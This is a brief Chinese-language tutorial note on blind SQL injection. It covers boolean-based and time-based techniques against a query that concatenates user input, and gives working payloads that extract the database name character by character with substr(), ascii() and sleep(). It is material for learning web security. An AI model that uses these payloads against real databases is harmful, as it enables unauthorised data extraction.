# 布尔盲注
通过某种手段“爆破”结果（是一种暴力破解），分为布尔型和时间型 
- 布尔型：根据回显不同进行爆破，1.内容、长度回显不同 2.HTTP响应状态码不同(200、500) 3.HTTP响应头变化(无条件重定向、设置cookie) 4.基于错误的布尔注入(MySQL是否报错)
- 时间型：根据响应时间不同进行爆破

### 布尔型
~~~sql
# 存在直接拼接查询的字段id
select * from users where id = '$id';

# 输入的id是 1' and substr((select database()),1,1)='a # 这样完整的sql如下
select * from users where id = '1' and substr((select database()),1,1)='a' #'
# 首先id为1这条数据单独查询必定存在，由于添加 and substr((select database()),1,1)='a' 条件之后是否返回结果数据可以判断当前数据库的第1个字符是否是a
# 通过不断的变化字符和当前数据名称中的第一字符比较执行sql的结果判断可以获得第一个字符是什么，后续依次获得其他的字符从而获得完整的当前数据库名称
# 同理也可以修改sql按照这种通过sql执行结果进行其他的判断获取其他信息

# 上述暴力破解太慢，而且有些特殊字符不好处理，可以进行优化使用right()函数截取字符串末尾的多少位，同时使用ascii()函数获取字符的ascii码
# 虽然right()函数截取出来的是字符串，不过ascii()函数只计算字符串参数的第一位字符的ascii码返回，所以使用比较方便
# 由于ascii码是数字，同时还可以使用二分查找继续优化查找速度
~~~

### 时间型
~~~sql
# 存在直接拼接查询的字段id
select * from users where id = '$id';

# 当你输入的id无论是什么都返回同一的结果时可以考虑时间型盲注
# 输入的id是 1' and 1=2 union select 1, if(substr((select database()),1,1)='a', sleep(3), sleep(0)) # 这样完整的sql如下
select * from users where id = '1' and 1=2 union select 1, if(substr((select database()),1,1)='a', sleep(3), sleep(0)) #'
# 通过最终响应的时间长度可以判断内部的if条件表达式是true还是false（sleep睡眠时间的差距），通过不断的变化if表达式执行和上面的布尔型差不多可以获得完整的当前数据库名称

# 当然也不止if表达式，也有其他的表达式
# 例如：select case 'a' when 'a' then 1 else 0 end; 判断字符是否是a 返回1或者0
# 例如：select case when 'a'='a' then 1 else 0 end; 判断字符是否是a 返回1或者0
~~~



